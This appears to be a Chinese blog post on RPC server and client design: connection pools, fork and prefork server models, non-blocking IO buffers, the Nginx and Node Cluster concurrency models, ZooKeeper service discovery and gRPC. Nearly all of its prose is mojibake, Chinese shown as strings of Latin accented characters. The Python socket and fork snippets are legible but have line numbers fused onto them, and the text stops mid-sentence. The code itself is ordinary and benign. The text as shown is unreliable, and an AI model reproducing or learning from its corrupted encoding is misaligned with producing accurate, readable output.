å¤šè·¯å¤ç”¨çš„è¿æ¥å¾€å¾€éƒ½æ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼Œå®ƒæ”¯æŒå¤šä¸ªçº¿ç¨‹åŒæ—¶å†™å…¥è¯·æ±‚è€Œä¸ä¼šå‡ºç°å¹¶å‘é—®é¢˜ã€‚ä½†æ˜¯å…¶å®ç°éš¾åº¦å’Œå·¥ä½œé‡éƒ½æ¯”è¾ƒå¤§ã€‚ å•å‘è¯·æ±‚ æœ‰äº›ä¸æ˜¯ç‰¹åˆ«é‡è¦çš„è¯·æ±‚å¯ä»¥ä¸éœ€è¦æœåŠ¡å™¨è¿›è¡Œå“åº”ï¼Œå®¢æˆ·ç«¯åœ¨å‘é€å®Œè¯·æ±‚ä¹‹åä¹Ÿä¸éœ€è¦ç­‰å¾…ç»“æœç›´æ¥è¿”å›ï¼Œè¿™å°±æ˜¯ oneway å•å‘è¯·æ±‚ï¼Œæ¯”å¦‚æ—¥å¿—ä¿¡æ¯ã€‚ Redis-py 12345678910111213141516171819def get_connection(self, command_name, *keys, **options): \"Get a connection from the pool\" self._checkpid() try: connection = self._available_connections.pop() except IndexError: connection = self.make_connection() self._in_use_connections.add(connection) return connection...def release(self, connection): \"Releases the connection back to the pool\" self._checkpid() if connection.pid != self.pid: return self._in_use_connections.remove(connection) self._available_connections.append(connection) RPCæœåŠ¡ç«¯ ä¸»çº¿æ²¿ç€ï¼šå•çº¿ç¨‹åŒæ­¥ -- å¤šçº¿ç¨‹åŒæ­¥ -- å¤šè¿›ç¨‹åŒæ­¥ -- PreforkingåŒæ­¥ -- å•è¿›ç¨‹å¼‚æ­¥ -- PreForkingå¼‚æ­¥ï¼Œè¿›è¡Œé€æ­¥åˆ†æã€‚ å•çº¿ç¨‹åŒæ­¥æ¨¡å‹ å•çº¿ç¨‹åŒæ­¥æ¨¡å‹çš„æœåŠ¡å™¨ï¼Œæ¯æ¬¡åªèƒ½å¤„ç†ä¸€ä¸ªå®¢æˆ·ç«¯è¿æ¥ï¼Œå…¶å®ƒè¿æ¥å¿…é¡»ç­‰åˆ°å‰é¢çš„è¿æ¥å…³é—­äº†æ‰èƒ½å¾—åˆ°æœåŠ¡å™¨çš„å¤„ç†ã€‚ å¤šçº¿ç¨‹åŒæ­¥æ¨¡å‹ æœåŠ¡å™¨å¯ä»¥å¹¶è¡Œå¤„ç†å¤šä¸ªå®¢æˆ·ç«¯ï¼Œæ¯ä¸€ä¸ªæ–°è¿æ¥å¼€å¯ä¸€ä¸ªæ–°çš„çº¿ç¨‹å•ç‹¬è¿›è¡Œå¤„ç†ã€‚æ¯ä¸ªçº¿ç¨‹éƒ½æ˜¯åŒæ­¥è¯»å†™ï¼ˆä¼šç­‰å¾…IOé˜»å¡ï¼‰å®¢æˆ·ç«¯è¿æ¥ã€‚ å¤šè¿›ç¨‹åŒæ­¥æ¨¡å‹ Python çš„ GIL è‡´ä½¿å•ä¸ªè¿›ç¨‹åªèƒ½å æ»¡ä¸€ä¸ª CPU æ ¸å¿ƒï¼Œå¤šçº¿ç¨‹å¹¶ä¸èƒ½å……åˆ†åˆ©ç”¨å¤šæ ¸çš„ä¼˜åŠ¿ã€‚æ‰€ä»¥å¤šæ•° Python æœåŠ¡å™¨æ¨èä½¿ç”¨å¤šè¿›ç¨‹æ¨¡å‹ã€‚ æœ¬è´¨å°±æ˜¯ä½¿ç”¨å•ç‹¬è¿›ç¨‹å¤„ç†æ¯ä¸ªæ–°è¿æ¥ã€‚ 12345678910111213# å¤„ç†æ–°é“¾æ¥while True: conn, addr = sock.accept() pid = os.fork() # å¥½æˆåœ¨è¿™é‡Œï¼Œåˆ›å»ºå­è¿›ç¨‹å¤„ç†æ–°è¿æ¥ if pid &lt; 0: # fork error return if pid &gt; 0: # parent process conn.close() # å…³é—­çˆ¶è¿›ç¨‹çš„è¿æ¥æ–‡ä»¶æè¿°ç¬¦ï¼Œå­è¿›ç¨‹ä¼šå¤„ç† continue if pid == 0: sock.close() # å¥—æ¥å­—å¼•ç”¨è®¡æ•°å‡ä¸€ï¼Œå­è¿›ç¨‹åˆ›å»ºå¯¼è‡´è®¡æ•°åŠ ä¸€ handle_conn(conn, addr, handlers) # åªä½¿ç”¨è¿æ¥æ–‡ä»¶æè¿°ç¬¦ break # å¤„ç†å®Œåä¸€å®šè¦é€€å‡ºå¾ªç¯ï¼Œä¸ç„¶å­è¿›ç¨‹ä¼šç»§ç»­ accept è¿æ¥ PreforkingåŒæ­¥æ¨¡å‹ è¿›ç¨‹è¦æ¯”çº¿ç¨‹æ›´åŠ åƒèµ„æºï¼Œå½“è¿æ¥å¢åŠ ï¼Œè¿›ç¨‹æ•°é‡å¢åŠ ï¼Œæ“ä½œç³»ç»Ÿçš„è°ƒåº¦å‹åŠ›ä¹Ÿå°±ä¼šå¢å¤§ã€‚ é‡‡ç”¨ PreForking æ¨¡å‹å¯ä»¥å¯¹å­è¿›ç¨‹çš„æ•°é‡è¿›è¡Œäº†é™åˆ¶ã€‚ PreForking æ˜¯é€šè¿‡é¢„å…ˆäº§ç”Ÿå¤šä¸ªå­è¿›ç¨‹ï¼Œå½“ä¸€ä¸ªè¿æ¥åˆ°æ¥æ—¶ï¼Œæ¯ä¸ªå­è¿›ç¨‹éƒ½æœ‰æœºä¼šæ‹¿åˆ°è¿™ä¸ªè¿æ¥ï¼Œä½†æ˜¯æœ€ç»ˆåªä¼šæœ‰ä¸€ä¸ªè¿›ç¨‹èƒ½ accept ã€‚ Prefork ä¹‹åï¼Œçˆ¶è¿›ç¨‹åˆ›å»ºçš„æœåŠ¡å¥—æ¥å­—å¼•ç”¨ï¼Œæ¯ä¸ªå­è¿›ç¨‹ä¹Ÿä¼šç»§æ‰¿ä¸€ä»½ï¼Œå®ƒä»¬å…±åŒæŒ‡å‘äº†æ“ä½œç³»ç»Ÿå†…æ ¸çš„å¥—æ¥å­—å¯¹è±¡ï¼Œå…±äº«äº†åŒä¸€ä»½è¿æ¥ç›‘å¬é˜Ÿåˆ—ã€‚ å­è¿›ç¨‹å’Œçˆ¶è¿›ç¨‹ä¸€æ ·éƒ½å¯ä»¥å¯¹æœåŠ¡å¥—æ¥å­—è¿›è¡Œ accept è°ƒç”¨ï¼Œä»å…±äº«çš„ç›‘å¬é˜Ÿåˆ—ä¸­æ‘˜å–ä¸€ä¸ªæ–°è¿æ¥è¿›è¡Œå¤„ç†ã€‚ å­è¿›ç¨‹æ‹¿åˆ°è¿æ¥åï¼Œè¯¥è¿›ç¨‹å†…éƒ¨å¯ä»¥ç»§ç»­ä½¿ç”¨å•çº¿ç¨‹æˆ–è€…å¤šçº¿ç¨‹åŒæ­¥çš„å½¢å¼å¯¹è¿æ¥è¿›è¡Œå¤„ç†ã€‚ 123456789101112131415161718def prefork(n): for i in range(n): pid = os.fork() if pid &lt; 0: # fork error return if pid &gt; 0: # parent process continue if pid == 0: break # child process...# å»ºç«‹socket...# preforkprefork(10)# è¿›è¡Œå•çº¿ç¨‹æˆ–è€…å¤šçº¿ç¨‹åŒæ­¥å¤„ç†é€»è¾‘... å•è¿›ç¨‹å¼‚æ­¥æ¨¡å‹ éé˜»å¡IO æ“ä½œç³»ç»Ÿæä¾›çš„æ–‡ä»¶è¯»å†™æ“ä½œé»˜è®¤éƒ½æ˜¯åŒæ­¥çš„ï¼Œå®ƒå¿…é¡»ç­‰åˆ°æ•°æ®å°±ç»ªåæ‰èƒ½è¿”å›ï¼Œå¦‚æœæ•°æ®æ²¡æœ‰å°±ç»ªï¼Œå®ƒå°±ä¼šé˜»å¡å½“å‰çš„çº¿ç¨‹ã€‚ éé˜»å¡é€‰é¡¹æ„å‘³ç€ï¼Œå†…æ ¸å¥—æ¥å­—çš„ ReadBuffer æœ‰å¤šå°‘å­—èŠ‚ï¼Œread æ“ä½œå°±è¿”å›å¤šå°‘å­—èŠ‚ï¼›å†…æ ¸å¥—æ¥å­—çš„ WriteBuffer æœ‰å¤šå°‘å‰©ä½™å­—èŠ‚ç©ºé—´ï¼Œwrite æ“ä½œå°±å†™å¤šå°‘å­—èŠ‚ã€‚ç„¶åçº¿ç¨‹å¯ä»¥ç»§ç»­å¹²åˆ«çš„äº‹ï¼Œç¨åå†ç»§ç»­è¿›è¡Œè¯»å†™ã€‚ äº‹ä»¶è½®è¯¢ selectã€ pollã€epoll ç­‰ç³»ç»Ÿè°ƒç”¨APIï¼Œå¯ä»¥ç›‘å¬æŸ¥è¯¢ç›¸å…³å¥—æ¥å­—æ˜¯å¦æœ‰ç›¸åº”çš„è¯»å†™äº‹ä»¶ã€‚è€Œä¸ç”¨è½®è¯¢æ¯ä¸€ä¸ªå¥—æ¥å­—æ–‡ä»¶æè¿°ç¬¦ï¼Œåå¤readå’Œwriteæ¥æ£€æŸ¥æ˜¯å¦æœ‰æ•°æ®ã€‚ äº‹ä»¶é©±åŠ¨çš„æ–¹å¼ï¼Œæ¯”è½®è¯¢æ›´é«˜æ•ˆã€‚æ²¡æœ‰äº‹ä»¶æ—¶ï¼Œ API ä¼šé˜»å¡ï¼ŒæœåŠ¡å™¨è¿›ç¨‹æ— äº‹å¯åšï¼Œä¸éœ€è¦ä¸€ç›´è½®è¯¢ã€‚ è¯»å†™ç¼“å†²åŒº è¯» éé˜»å¡ IO è¦æ±‚ç”¨æˆ·ç¨‹åºä¸ºæ¯ä¸ªå¥—æ¥å­—ç»´æŒä¸€ä¸ª ReadBufferï¼Œå®ƒå’Œæ“ä½œç³»ç»Ÿå†…æ ¸åŒºçš„ ReadBuffer ä¸æ˜¯åŒä¸€ä¸ªä¸œè¥¿ã€‚ç”¨æˆ·æ€çš„ ReadBuffer æ˜¯ç”±ç”¨æˆ·ä»£ç æ¥è¿›è¡Œæ§åˆ¶ã€‚ å› ä¸ºè¯»æ˜¯éé˜»å¡çš„ã€‚å½“æˆ‘ä»¬æƒ³è¦è¯»å– 100 ä¸ªå­—èŠ‚æ—¶ï¼Œæˆ‘ä»¬å¯èƒ½ç»å†äº†å¤šæ¬¡ read è°ƒç”¨ï¼Œç¬¬ä¸€æ¬¡è¯»äº† 10 ä¸ªå­—èŠ‚ï¼Œç¬¬äºŒæ¬¡ 30 ä¸ªå­—èŠ‚ï¼Œç„¶ååˆè¯»äº† 80 ä¸ªå­—èŠ‚ã€‚å‡‘å¤Ÿäº† 100 ä¸ªå­—èŠ‚æ—¶ï¼Œå¯ä»¥è§£ç å‡ºä¸€ä¸ªå®Œæ•´çš„è¯·æ±‚ï¼Œå‰©ä½™çš„ 20 ä¸ªå­—èŠ‚åˆæ˜¯åé¢è¯·æ±‚æ¶ˆæ¯çš„ä¸€éƒ¨åˆ†ã€‚è¿™å°±æ˜¯æ‰€è°“çš„åŠåŒ…é—®é¢˜ã€‚ ç”¨æˆ·æ€çš„ ReadBuffer å°±æ˜¯æ¥ä¿å­˜åŠåŒ…æ¶ˆæ¯çš„ï¼Œç›´åˆ°å¯ä»¥è§£ç å‡ºä¸€ä¸ªå®Œæ•´çš„æ¶ˆæ¯å†…å®¹ã€‚ å†™ éé˜»å¡å†™ï¼Œæ„å‘³ç€å½“æˆ‘ä»¬æƒ³è¦å†™ 100 ä¸ªå­—èŠ‚æ—¶ï¼Œæˆ‘ä»¬å¯èƒ½ç»å†äº†å¤šæ¬¡ write è°ƒç”¨ï¼Œç¬¬ä¸€æ¬¡ write äº† 10 ä¸ªå­—èŠ‚ï¼Œç¬¬äºŒæ¬¡ write äº† 30 ä¸ªå­—èŠ‚ï¼Œæœ€åæ‰æŠŠå‰©ä½™çš„ 60 ä¸ªå­—èŠ‚å†™å‡ºå»äº†ã€‚ ç”¨æˆ·æ€WriteBufferå°±æ˜¯ä¿å­˜ç¬¬ä¸€æ²¡å†™å®Œçš„90å­—èŠ‚ã€ç¬¬äºŒæ¬¡æ²¡å†™å®Œçš„60å­—èŠ‚çš„ï¼Œè®©ä¸‹ä¸€æ¬¡ write å¯ä»¥ç»§ç»­å†™å®Œå‰©ä½™çš„éƒ¨åˆ†ã€‚ PreForkingå¼‚æ­¥ å°† PreForking æœºåˆ¶å’Œäº‹ä»¶è½®è¯¢å¼‚æ­¥è¯»å†™ç»“åˆèµ·æ¥ï¼Œå¯ä»¥è¿›ä¸€æ­¥æå‡ç³»ç»Ÿé«˜å¹¶å‘çš„èƒ½åŠ›ã€‚ å¼€æºæ¡†æ¶ Tornado å’Œå¼€æºä»£ç†æœåŠ¡å™¨ Nginx æ­£æ˜¯é‡‡ç”¨äº†å¤šè¿›ç¨‹ PreForking å¼‚æ­¥æ¨¡å‹ã€‚ Nginx å¹¶å‘æ¨¡å‹ Nginx çš„å¹¶å‘æ¨¡å‹æ˜¯ä¸€ä¸ªå¤šè¿›ç¨‹å¹¶å‘æ¨¡å‹ï¼Œå®ƒçš„ Master è¿›ç¨‹åœ¨ç»‘å®šç›‘å¬åœ°å€ç«¯å£å fork å‡ºäº†å¤šä¸ª Slave è¿›ç¨‹å…±åŒç«äº‰å¤„ç†è¿™ä¸ªæœåŠ¡ç«¯å¥—æ¥å­—æ¥æ”¶åˆ°çš„å¾ˆå¤šå®¢æˆ·ç«¯è¿æ¥ã€‚ Slave è¿›ç¨‹ä¼šå…±äº«åŒä¸€ä¸ªå¤„äºæ“ä½œç³»ç»Ÿå†…æ ¸æ€çš„å¥—æ¥å­—é˜Ÿåˆ—ã€‚ è¿™æ˜¯ä¸€ä¸ªç”Ÿäº§è€…æ¶ˆè´¹è€…æ¨¡å‹ï¼Œç”Ÿäº§è€…æ˜¯æ“ä½œç³»ç»Ÿçš„ç½‘ç»œæ¨¡å—ï¼Œæ¶ˆè´¹è€…æ˜¯å¤šä¸ª Slave è¿›ç¨‹ï¼Œé˜Ÿåˆ—ä¸­çš„å¯¹è±¡æ˜¯ä¸å®¢æˆ·ç«¯è¿æ¥çš„å¥—æ¥å­—ã€‚ è¿™ç§æ¨¡å‹åœ¨è´Ÿè½½å‡è¡¡ä¸Šæœ‰ä¸€ä¸ªç¼ºç‚¹ï¼Œé‚£å°±æ˜¯å¥—æ¥å­—åˆ†é…ä¸å‡åŒ€ï¼Œã€Œé—²è€…æ„ˆé—²ï¼Œå¿™è€…æ„ˆå¿™ã€çš„çŠ¶æ€ã€‚ å› ä¸ºå½“å¤šä¸ªè¿›ç¨‹ç«äº‰åŒä¸€ä¸ªå¥—æ¥å­—é˜Ÿåˆ—æ—¶ï¼Œæ“ä½œç³»ç»Ÿé‡‡ç”¨äº† LIFO çš„ç­–ç•¥ï¼Œæœ€åä¸€ä¸ªæ¥ accept çš„è¿›ç¨‹æœ€ä¼˜å…ˆæ‹¿åˆ°å¥—æ¥å­—ã€‚è¶Šæ˜¯ç¹å¿™çš„è¿›ç¨‹è¶Šæ˜¯æœ‰æ›´å¤šçš„æœºä¼šè°ƒç”¨ acceptï¼Œå®ƒèƒ½æ‹¿åˆ°çš„å¥—æ¥å­—ä¹Ÿå°±è¶Šå¤šã€‚ Node Cluster å¹¶å‘æ¨¡å‹ Node Cluster ä¸ºäº†è§£å†³è´Ÿè½½å‡è¡¡é—®é¢˜ï¼Œè§„å®šè´Ÿè´£ accept å¥—æ¥å­—çš„åªèƒ½æ˜¯ Master è¿›ç¨‹ï¼ŒSlave è¿›ç¨‹åªè´Ÿè´£å¤„ç†å®¢æˆ·ç«¯å¥—æ¥å­—è¯·æ±‚ã€‚çˆ¶è¿›ç¨‹å°±å¯ä»¥å°† accept åˆ°çš„å®¢æˆ·ç«¯å¥—æ¥å­—è½®æµä¼ é€’ç»™å¤šä¸ª Slave è¿›ç¨‹ï¼Œè´Ÿè½½å‡è¡¡çš„ç›®æ ‡å°±å¯ä»¥é¡ºåˆ©å®ç°äº†ã€‚ ä½¿ç”¨æœ¬åœ°å¥—æ¥å­—è¿›è¡Œè¿›ç¨‹é—´é€šä¿¡ï¼Œå°† Master ä¸­å®Œæˆ accept çš„å¥—æ¥å­—å‘é€åˆ° Slave å­è¿›ç¨‹ä¸­ã€‚è¿™é‡Œçš„ä¼ é€’æè¿°ç¬¦ï¼Œæœ¬è´¨ä¸Šä¸æ˜¯ä¼ é€’ï¼Œè€Œæ˜¯å¤åˆ¶ã€‚å­è¿›ç¨‹æ”¶åˆ°çš„æè¿°ç¬¦å’Œçˆ¶è¿›ç¨‹çš„æè¿°ç¬¦ä¹Ÿä¸æ˜¯åŒä¸€ä¸ªå€¼ã€‚ä½†æ˜¯çˆ¶å­è¿›ç¨‹çš„æè¿°ç¬¦éƒ½ä¼šæŒ‡å‘åŒä¸€ä¸ªå†…æ ¸å¥—æ¥å­—å¯¹è±¡ã€‚ æœ¬åœ°å¥—æ¥å­—åˆ†ä¸ºä¸¤ç§ï¼Œæœ‰åå¥—æ¥å­—å’Œæ— åå¥—æ¥å­—ã€‚æœ‰åå¥—æ¥å­—ä¼šåœ¨æ–‡ä»¶ç³»ç»ŸæŒ‡å®šä¸€ä¸ªè·¯å¾„åï¼Œè¿›ç¨‹ä¹‹é—´éƒ½å¯ä»¥é€šè¿‡è¿™ä¸ªè·¯å¾„æ¥è®¿é—®æœ¬åœ°å¥—æ¥å­—ã€‚æ— åå¥—æ¥å­—ä¸€èˆ¬ç”¨äºçˆ¶å­è¿›ç¨‹ä¹‹é—´ï¼Œçˆ¶è¿›ç¨‹ä¸­åˆ›å»ºæœ¬åœ°å¥—æ¥å­—ï¼Œå­è¿›ç¨‹ä¸­æŒæœ‰è¿™ä¸ªå¥—æ¥å­—çš„å¼•ç”¨ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243def prefork(serv_sock, n): pws = [] for i in range(n): pr, pw = socket.socketpair() # çˆ¶å­è¿›ç¨‹é€šä¿¡å¥—æ¥å­— pid = os.fork() if pid &lt; 0: # fork error return pws if pid &gt; 0: pr.close() # çˆ¶è¿›ç¨‹ä¸ç”¨è¯» pws.append(pw) continue if pid == 0: serv_sock.close() # å…³é—­å¼•ç”¨ pw.close() # å­è¿›ç¨‹ä¸ç”¨å†™ return pr return pws# å»ºç«‹socketï¼Œç›‘å¬æŸç«¯å£...pws_or_pr = prefork(serv_sock, 10)# çˆ¶è¿›ç¨‹if hasattr(pws_or_pr, '__len__'): ... while True: sock, addr = serv_sock.accept() pw = pws[idx % len(pws)] # round robin é¡ºåºå‘é€ ... pw.sendmsg(msg, config) # Master å‘å­è¿›ç¨‹å‘é€è¿æ¥æ–‡ä»¶æè¿°ç¬¦ sock.close() # å…³é—­å¼•ç”¨ idx += 1 ...else: # å­è¿›ç¨‹ while True: ... msg, ancdata, flags, addr = pr.recvmsg(bufsize, ancsize) ... # ä» pr ä¸­è¯»å–å®¢æˆ·ç«¯è¿æ¥çš„æ–‡ä»¶æè¿°ç¬¦ fd # åœ¨å­è¿›ç¨‹ä¸­å¤„ç†ï¼Œå»ºç«‹å¥—æ¥å­—è¿›è¡Œè¯»å†™æ“ä½œ sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, fileno=fd) ... # å¤„ç†è¿æ¥è¯·æ±‚ åˆ†å¸ƒå¼ç³»ç»Ÿä¸­çš„RPC å½“ RPC æœåŠ¡éƒ¨ç½²åœ¨å¤šä¸ªèŠ‚ç‚¹ä¸Šæ—¶ï¼Œå®¢æˆ·ç«¯å¾—åˆ°çš„æ˜¯ä¸€ä¸ªæœåŠ¡åˆ—è¡¨ï¼Œæœ‰å¤šä¸ª IP ç«¯å£å¯¹ã€‚å®¢æˆ·ç«¯çš„è¿æ¥æ± å¯ä»¥éšæœºåœ°æŒ‘é€‰ä»»æ„çš„ RPC æœåŠ¡èŠ‚ç‚¹è¿›è¡Œè¿æ¥ã€‚ è®¾ç½®æœåŠ¡èŠ‚ç‚¹æƒå€¼ï¼Œå¯ä»¥æ§åˆ¶æ¯ä¸ªèŠ‚ç‚¹è¢«å®¢æˆ·ç«¯é€‰ä¸­çš„æ¦‚ç‡ã€‚ ç³»ç»Ÿå®¹ç¾ å®¢æˆ·ç«¯å‘èµ·è¯·æ±‚ï¼Œå½“æ”¶åˆ°è¯·æ±‚çš„èŠ‚ç‚¹æŒ‚æ‰æ—¶ï¼Œå°†å¤±æ•ˆèŠ‚ç‚¹æ‘˜é™¤ï¼Œæ”¾ç½®åˆ°å¤±æ•ˆèŠ‚ç‚¹åˆ—è¡¨ä¸­ã€‚æ¯éš”ä¸€æ®µæ—¶é—´æ£€æŸ¥å¤±æ•ˆèŠ‚ç‚¹æ˜¯å¦æ¢å¤äº†ï¼Œå¦‚æœæ¢å¤äº†ï¼Œé‚£å°±ä»å¤±æ•ˆèŠ‚ç‚¹ä¸­ç§»é™¤ï¼Œå†å°†èŠ‚ç‚¹åœ°å€é‡æ–°åŠ å…¥åˆ°æœ‰æ•ˆèŠ‚ç‚¹åˆ—è¡¨ä¸­ã€‚ åˆ¤æ–­èŠ‚ç‚¹æ˜¯å¦å¤±æ•ˆçš„æ–¹æ³•æ˜¯ï¼Œç»Ÿè®¡åœ¨ä¸€å®šæ—¶é—´çª—å£é‡Œå‡ºç°çš„é”™è¯¯æ•°é‡ã€‚å¦‚æœè¿™ä¸ªæ•°é‡è¿‡å¤§ï¼Œé‚£å°±æ„å‘³ç€å¤±æ•ˆäº†ã€‚ä¹‹æ‰€ä»¥ä½¿ç”¨ä¸€ä¸ªæ—¶é—´çª—å£ï¼Œä¸»è¦æ˜¯é˜²æ­¢ç”±äºç½‘ç»œçš„ç¬é—´æ³¢åŠ¨å¯¼è‡´çš„è¯·æ±‚å¼‚å¸¸ï¼Œé€ æˆå¤±æ•ˆçš„è¯¯åˆ¤ã€‚ è¯·æ±‚é‡è¯•ç­–ç•¥ å½“è¯·æ±‚å¤±è´¥æ—¶ï¼Œå®¢æˆ·ç«¯è¿˜è¦è¿›è¡Œé‡è¯•ï¼Œä½†æ˜¯ä¹Ÿä¸å¯ä»¥æ— é™é‡è¯•ï¼Œè¦æœ‰ä¸€å®šçš„é‡è¯•ç­–ç•¥ã€‚é™æƒæ³•æ˜¯ä¸€ç§ç­–ç•¥ã€‚ å®¢æˆ·ç«¯ä¼šæ”¹å˜æœåŠ¡èŠ‚ç‚¹æƒå€¼ã€‚å¦‚æœæŸä¸ªèŠ‚ç‚¹å‡ºç°äº†ä¸€æ¬¡è°ƒç”¨é”™è¯¯ï¼Œå¯ä»¥å¯¹è¯¥èŠ‚ç‚¹è¿›è¡Œé™æƒï¼ˆæ¯”å¦‚æƒå€¼å‡åŠï¼‰ï¼Œç›´åˆ°è¾¾åˆ°ä¸€ä¸ªæœ€å°å€¼ã€‚ ä¹‹æ‰€ä»¥ä¸åº”è¯¥é™åˆ°é›¶ï¼Œé‚£æ˜¯ä¸ºäº†ç»™èŠ‚ç‚¹æä¾›ä¸€ä¸ªæ¢å¤çš„æœºä¼šã€‚è¢«é™æƒçš„èŠ‚ç‚¹åæ¥åªè¦æœ‰ä¸€æ¬¡è°ƒç”¨æˆåŠŸï¼Œé‚£ä¹ˆ weight å€¼å°±åº”è¯¥å°½å¿«è¢«è¿˜åŸï¼Œå¿«é€Ÿæ¢å¤ä¸ºæ­£å¸¸èŠ‚ç‚¹ã€‚ è€ƒè™‘åˆ°ç½‘ç»œæ³¢åŠ¨çš„å½±å“ï¼Œé™æƒä¸åº”å¤ªå¿«ï¼Œå¯¼è‡´æµé‡åˆ†é…æ³¢åŠ¨è¿‡å¿«ã€‚ æœåŠ¡å‘ç° å³ï¼Œå¢åŠ ç‰©ç†æœºå™¨èŠ‚ç‚¹æ—¶ï¼Œå¯ä»¥åŠ¨æ€å˜æ›´å½“å‰èŠ‚ç‚¹åˆ—è¡¨ï¼Œè€Œä¸ç”¨æ‰‹åŠ¨é…ç½®ï¼Œä¹Ÿä¸ç”¨é‡å¯ç³»ç»Ÿã€‚ æœåŠ¡å‘ç°æŠ€æœ¯ä¾èµ–äºæœåŠ¡ä¹‹é—´çš„ç‰¹æ®Šä¸­é—´èŠ‚ç‚¹ã€‚è¿™ä¸ªèŠ‚ç‚¹çš„ä½œç”¨å°±æ˜¯æ¥å—æœåŠ¡çš„æ³¨å†Œï¼Œæä¾›æœåŠ¡çš„æŸ¥æ‰¾ï¼Œä»¥åŠæœåŠ¡åˆ—è¡¨å˜æ›´çš„å®æ—¶é€šçŸ¥åŠŸèƒ½ã€‚å®ƒä¸€èˆ¬ä½¿ç”¨æ”¯æŒé«˜å¯ç”¨çš„åˆ†å¸ƒå¼é…ç½®æ•°æ®åº“ï¼Œå¦‚ zookeeper/etcd ç­‰ã€‚ ä¸»è¦åŒ…æ‹¬ä¸‰ä¸ªå†…å®¹ï¼š æœåŠ¡æ³¨å†Œï¼šæœåŠ¡èŠ‚ç‚¹åœ¨å¯åŠ¨æ—¶å°†è‡ªå·±çš„æœåŠ¡åœ°å€æ³¨å†Œåˆ°ä¸­é—´èŠ‚ç‚¹ æœåŠ¡æŸ¥æ‰¾ï¼šå®¢æˆ·ç«¯å¯åŠ¨æ—¶å»ä¸­é—´èŠ‚ç‚¹æŸ¥è¯¢æœåŠ¡åœ°å€åˆ—è¡¨ æœåŠ¡å˜æ›´é€šçŸ¥ï¼šå½“æœåŠ¡åˆ—è¡¨å˜æ›´æ—¶ï¼Œä¸­é—´èŠ‚ç‚¹è´Ÿè´£å°†å˜æ›´ä¿¡æ¯å®æ—¶é€šçŸ¥ç»™å®¢æˆ·ç«¯ã€‚ ZooKeeper ZooKeeper ä½¿ç”¨èŠ‚ç‚¹å­˜å‚¨æœåŠ¡å™¨çš„åœ°å€ä¿¡æ¯ã€‚ZooKeeper çš„èŠ‚ç‚¹ä¿¡æ¯ä»¥æ ‘çŠ¶ç»“æ„å­˜å‚¨åœ¨å†…å­˜ä¸­ã€‚ä½¿ç”¨ä¸´æ—¶èŠ‚ç‚¹æœºåˆ¶ï¼Œæ”¯æŒçŸ­æ—¶é—´å†…æ–­å¼€é‡è¿ï¼Œç›´åˆ°è¿‡æœŸæ—¶é—´ï¼Œè‹¥æ²¡æœ‰å‘ä¸´æ—¶èŠ‚ç‚¹å‘é€æŒ‡ä»¤ï¼Œå…¶å°†è¢«åˆ é™¤ã€‚ ZooKeeper æä¾›äº† watch åŠŸèƒ½ï¼Œåœ¨èŠ‚ç‚¹å˜åŠ¨æ—¶ï¼Œå®¢æˆ·ç«¯å¯ä»¥æ”¶åˆ°é€šçŸ¥ï¼Œè¿›è€Œé‡åŠ è½½æœåŠ¡åˆ—è¡¨ã€‚ ä¸€ä¸ªåˆ†å¸ƒå¼RPCç®€ä»‹ å®ç°å‡ºä¸€ä¸ª PreForking å¼‚æ­¥æ¨¡å‹çš„å•æœº RPC æœåŠ¡å™¨ï¼Œå•æœºæœåŠ¡å™¨å¯¹å­è¿›ç¨‹è¿›è¡Œç®¡ç†ï¼Œä¿¡å·ç›‘å¬å’Œå­è¿›ç¨‹å›æ”¶ç­‰ï¼› ç„¶åå°†æœåŠ¡æŒ‚æ¥åˆ° ZooKeeper çš„æ ‘èŠ‚ç‚¹ä¸Šï¼› å†ç¼–å†™å®¢æˆ·ç«¯æ¶ˆè´¹è€…ä» ZooKeeper ä¸­è¯»å–æœåŠ¡èŠ‚ç‚¹åœ°å€ï¼Œè¿æ¥ RPC æœåŠ¡å™¨è¿›è¡Œäº¤äº’ï¼› åŒæ—¶è¿˜è¦ç›‘å¬ ZooKeeper æ ‘èŠ‚ç‚¹çš„å˜æ›´ï¼Œåœ¨ RPC æœåŠ¡å™¨èŠ‚ç‚¹å˜åŠ¨æ—¶èƒ½åŠ¨æ€è°ƒæ•´æœåŠ¡åˆ—è¡¨åœ°å€ã€‚ gRPCç®€ä»‹ gRPC é€‰æ‹© HTTP2.0 ä½œä¸ºåŸºç¡€åè®®ã€‚HTTP2.0æœ‰ä¸€äº›ç‰¹æ€§ï¼Œä½¿å¾—ä¼ è¾“æ•ˆç‡å¾—åˆ°æå‡ï¼š HTTP2.0 æ˜¯åŸºäºäºŒè¿›åˆ¶åè®®çš„ä¹±åºæ¨¡å¼ (Duplexing)ã€‚è¿™æ„å‘³åŒä¸€ä¸ªè¿æ¥é€šé“ä¸Šå¤šä¸ªè¯·æ±‚å¹¶è¡Œæ—¶ï¼ŒæœåŠ¡å™¨å¤„ç†å¿«çš„å¯ä»¥å…ˆè¿”å›è€Œä¸ç”¨é¡ºåºç­‰å¾…ã€‚ HTTP2.0 å¯¹è¯·æ±‚å¤´çš„ key/value åšäº†å­—å…¸å¤„ç†ï¼Œå¯¹äºå¸¸ç”¨çš„ key/value æ–‡æœ¬æ— éœ€é‡å¤ä¼ é€ï¼Œè€Œæ˜¯é€šè¿‡å¼•ç”¨å†…éƒ¨å­—å…¸çš„æ•´æ•°ç´¢å¼•ï¼Œæ˜¾è‘—èŠ‚çœäº†è¯·æ±‚å¤´ä¼ è¾“æµé‡ã€‚ HTTP2.0 ä½¿ç”¨åˆ†å¸§ä¼ é€ã€‚åŒä¸€ä¸ªå“åº”ä¼šæœ‰åŒä¸€ä¸ª stream_idï¼Œæ¶ˆæ¯æ¥æ”¶ç«¯ä¼šå°†å…·æœ‰ç›¸åŒ stream_id çš„æ¶ˆæ¯å¸§ä¸²èµ·æ¥ä½œä¸ºä¸€ä¸ªæ•´ä½“æ¥å¤„ç†ã€‚åŒä¸€ä¸ªè¿æ¥ä¸Šä¼šæœ‰å¤šä¸ªæµç©¿æ’ä¼ è¾“ï¼Œç›¸äº’ä¹‹é—´äº’ä¸å½±å“ã€‚ æ¶ˆæ¯åè®®ä½¿ç”¨ protobufï¼Œè¿™åœ¨å‰é¢æœ‰ä»‹ç»ã€‚ gRPC é»˜è®¤ä½¿ç”¨çš„æ˜¯å¼‚æ­¥ IO æ¨¡å‹ï¼Œåº•å±‚æœ‰ä¸€ä¸ªç‹¬ç«‹çš„äº‹ä»¶å¾ªç¯ã€‚gRPC 